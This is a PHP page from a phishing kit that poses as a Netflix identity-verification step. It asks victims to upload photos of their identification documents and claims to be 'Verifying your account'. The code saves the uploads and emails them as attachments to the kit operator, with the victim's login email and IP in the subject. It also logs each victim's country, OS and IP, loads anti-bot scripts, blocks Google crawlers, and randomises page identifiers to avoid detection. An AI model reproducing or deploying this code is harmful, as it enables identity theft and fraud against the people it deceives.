<?php
session_start();
error_reporting(0);
$TIME_DATE = date('H:i:s d/m/Y');
include('../../../RGN/functions/Email.php');
include('../../../RGN/functions/get_lang_en.php');
include('../../../RGN/functions/get_browser.php');
    if(isset($_FILES) && (bool) $_FILES) {
        $AllowedExtensions = ["gif","jpeg","jpg","png"];
        $files = [];
        $server_file = [];
        foreach($_FILES as $name => $file) {
            $file_name = $file["name"];
            $file_temp = $file["tmp_name"];
            foreach($file_name as $key) {
                $path_parts = pathinfo($key);
                $extension = strtolower($path_parts["extension"]);
                if(!in_array($extension, $AllowedExtensions)) { die("Extension not allowed"); }
                $server_file[] = "../../../RGN/A797XX666XX.acropo/{$path_parts["basename"]}";
            }
            for($i = 0; $i<count($file_temp); $i++) { move_uploaded_file($file_temp[$i], $server_file[$i]); }
        }
        $Z118_SUBJECT = "".$_SESSION['_login_email_']." ✪ ".$_SESSION['_ip_']." ✪";
        $Z118_MESSAGE = $TIME_DATE;
        $Z118_HEADERS = "From:DWM+18_NT+ID <noreply@idyat.com>";
        $SEMI_RAND = md5(time());
        $MIME_BOUNDARY = "==Multipart_Boundary_x{$SEMI_RAND}x";
        $Z118_HEADERS .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed;\n" . " boundary=\"{$MIME_BOUNDARY}\"";
        $Z118_MESSAGE = "This is a multi-part message in MIME format.\n\n" . "--{$MIME_BOUNDARY}\n" . "Content-Type: text/plain; charset=\"iso-8859-1\"\n" . "Content-Transfer-Encoding: 7bit\n\n" . $Z118_MESSAGE . "\n\n";
        $Z118_MESSAGE .= "--{$MIME_BOUNDARY}\n";
        $FfilenameCount = 0;
        for($i = 0; $i<count($server_file); $i++) {
            $afile = fopen($server_file[$i],"rb");
            $data = fread($afile,filesize($server_file[$i]));
            fclose($afile);
            $data = chunk_split(base64_encode($data));
            $name = $file_name[$i];
            $Z118_MESSAGE .= "Content-Type: {\"application/octet-stream\"};\n" . " name=\"$name\"\n" .
                "Content-Disposition: attachment;\n" . " filename=\"$name\"\n" .
                "Content-Transfer-Encoding: base64\n\n" . $data . "\n\n";
            $Z118_MESSAGE .= "--{$MIME_BOUNDARY}\n";
        }
        if(mail($RouGani, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS)) {
            HEADER("Location: ../success/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
        }
		
		//////////////////////////////////////////////////RouGani //////////////////////////////////////////////

		
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

date_default_timezone_set('Africa/Tunis');
$TIME = date("d-m-Y H:i:s"); 
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ;
$ip = getenv("REMOTE_ADDR");
$OS =getOS($_SERVER['HTTP_USER_AGENT']);
$file = fopen("../../../logs.txt","a");
fwrite($file,"".$TIME." - ".$COUNTRY." - ".$OS." - ".$ip."                => IDENTITY DONE ! \n")  ;
    }
$_SESSION['_cc_type_'] = ucwords(strtolower($_SESSION['_cc_type_']));
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html class="<?="x_".rand(39464, 20555)."ID-Z".rand(780699, 5123446)?> xx_Z118xMARVEL xx_Z118xDCxComic <?="x_".rand(39464, 20555)."ID-Z".rand(780699, 5123446)?> x_PowerRxRagers_x <?="x_".rand(39464, 20555)."ID-Z".rand(780699, 5123446)?>" dir="ltr" id="<?="PP-ID00".rand(118, 10011454198745)?>">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title><?=$Z118_title." ".$_SESSION['_LOOKUP_CNTRCODE_'];?></title>
    <!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
    <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
	<!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
    <link rel="shortcut icon" type="image/x-icon" href="../../../RGN/lib/img/favicon.ico">
    <link rel="apple-touch-icon" href="../../../RGN/lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<!------------------------------- FILES CSS STYLE --------------------------------->
    <link rel="stylesheet" href="../../../RGN/lib/css/G-Z118.css">
    <link rel="stylesheet" href="../../../RGN/INC/U1-Z118.css">
	<link rel="stylesheet" type="text/css" href="../../../RGN/lib/css/font-awesome.min.css">
	<!------------------------------- FILES CSS STYLE --------------------------------->
</head>
<body id="<?=rand(98, 45)."x_N666N".rand(11800918, 1001198745)?>" class="<?=rand(98, 45)."v_x666x".rand(11800918, 1001198745)?>">
<div class="nav_mobile" >
<div class="nfHeader signupBasicHeader" data-reactid=".20urkhey51c.1">
<a href="#" class="icon-logoUpdate nfLogo signupBasicHeader" data-reactid=".20urkhey51c.1.1"></a>
<a href="#" class="authLinks signupBasicHeader" data-reactid=".20urkhey51c.1.2">Sign Out</a>
</div>
   	<div class="netif_m">
      <i class="fa fa-bell fa-lg" aria-hidden="true" style="  cursor: pointer;  font-size: 25px; color: #F5F7FA;"></i>
    </div>
   </div>
<div class="menu_desk">
<div class="nfHeader signupBasicHeader" data-reactid=".20urkhey51c.1">
<a href="#" class="icon-logoUpdate nfLogo signupBasicHeader" data-reactid=".20urkhey51c.1.1"></a>
<a href="#" class="authLinks signupBasicHeader" data-reactid=".20urkhey51c.1.2">Sign Out</a>
</div>
</div>
<div class="RGN-DV-K7L"><p class="P-RGN-1"><?=$msj_dyal_zeb;?></p></div><br><br>
    <xx_GOxGO class="Browxx_GOxGOZ118" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
        <section id="content" role="xx_GOxGO" data-country="US">
            <section id="xx_GOxGO" class="">
                <div id="WorldWide" class="WorldWide xGhostxRider_JC" for="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                    <div id="msform" class="x_V654DF654THEBEASTXX" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"style="width: 80%;">
					            <ul id="progressbar">
									<li style="width: 25%;">Billing Info</li>
									<li style="width: 25%;">Card Info</li>
									<li class="active" style="width: 25%;">Identity Info</li>
									<li style="width: 25%;">Congratulations</li>
								</ul>
						<div class="HeaderZ118" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                            <h2 id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_id_title;?></h2>
                        </div>
                        <div class="MightyxMorphin" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                            <div class="0Dats_Good0" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                                <p style="font-size: 1.2em;"><?=$Z118_id_ask;?></p>
                                <div class="Zaz" style="margin-left: 3em;margin-bottom: 1em;font-size: 14px;" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                                    <ul>    
                                        <li id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_id_li_1."".$_SESSION['_cc_type_']." Card";?></li>
                                        <li id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_id_li_2;?></li>
										<li id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_id_li_3;?></li>
                                    </ul>
                                </div>
								<p class="okk" style="font-size: 1.2em;" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_id_example;?></p>
                                <i class="icon-jfi-cloud-up-o" style="margin-bottom:2px" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"></i>
                                <form class="validator" action="" method="post" enctype="multipart/form-data" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
								    <div id="errorDiv" style="color: red;"></div>
                                    <input type="file" name="image" id="filer_input" multiple="multiple" required="required" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                                    <div class="agreeTC checkbox" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                                        <div class="x_V-ForZ118" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                                            <label class="helpNotifyUS" role="button" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_agree;?><a data-click="userAgreement" href="#" target="_blank"><?=$Z118_user_agrement;?></a>, <a data-click="privacyPolicy" href="#" target="_blank"><?=$Z118_privacy;?></a><?=$Z118_and;?><a data-click="esign" href="#" target="_blank"><?=$Z118_policy;?></a>.</label>
                                        </div>
                                    </div>
                                    <input id="submitBtn" name="" type="submit" class="ButtonZ118" value="<?=$Z118_submit;?>" data-click="WorldWideSubmit">
								</form>
                            </div>
                        </div>   
                    </div>
                </div>
            </section>
        </section>
    </xx_GOxGO>
    <footer id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> gblFooter" role="contentinfo" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
        <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> F00GER00 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> IntentF00GER00" id="<?="PP-Z118".rand(1180018, 1001198745)?>">
            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> F00GER00Nav <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xGhostxRider_JC <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> legal <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                        <p class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> copyright <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">© <?=date('Y');?> Νеtflіx</p>
                        <ul>
                            <li><a id="<?="privacyPolicy".rand(1180018, 1001198745)?> data-click="privacyPolicy" href="#" target="_blank"><?=$Z118_fPrivacy;?></a></li>
                            <li><a id="<?="legalAgreement".rand(1180018, 1001198745)?> data-click="legalAgreement" href="#" target="_blank"><?=$Z118_flegal;?></a></li>
                            <li><a id="<?="contactUs".rand(1180018, 1001198745)?> data-click="contactUs" href="#" target="_blank"><?=$Z118_fHelpCenter;?></a></li>
                            <li class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> siteFeedback <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> siteFeedback <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> "></li>
                        </ul>
						<div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> flag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> countryFlag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
						<a id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" data-click="flagChange" href="#" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> countryFlag <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> country <?=$_SESSION['_LOOKUP_CNTRCODE_'];?>"><?="countryFlag".rand(1188, 10745)?></a>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
	<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src="../../../RGN/lib/js/jquery.js" type="text/javascript"></script>
	<script src="../../../RGN/lib/js/jquery.validate.js" type="text/javascript"></script>
    <script src="../../../RGN/INC/jquery.filer.js" type="text/javascript"></script>
    <script type="text/javascript"> 
	$(document).ready(function() {
        $('#filer_input').filer( {addMore: true, required: true, limit: 2, maxSize: 3, extensions: ["jpg", "png", "gif"], showThumbs: true});
	});
	$("body").on("click", ".ButtonZ118", function () {
            var allowedFiles = [".jpg", ".jpeg", ".png"];
            var fileUpload = $("#filer_input");
            var lblError = $("#errorDiv");
            var regex = new RegExp("([a-zA-Z0-9\s_\\.\-:])+(" + allowedFiles.join('|') + ")$");
            if (!regex.test(fileUpload.val().toLowerCase())) {
                lblError.html("Please select your identification documents !");
                return false;
            }
            lblError.html('');
			$(".rotation").delay(0).fadeIn(300);
            return true;
        });
    </script>
	<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <div class="rotation"><p style="font-size: 17px;font-family: Z118-Sans-Small-Regular, Helvetica Neue, Arial, sans-serif;margin-left: 14px;">Verifying your account...</p></div>
</body>
</html>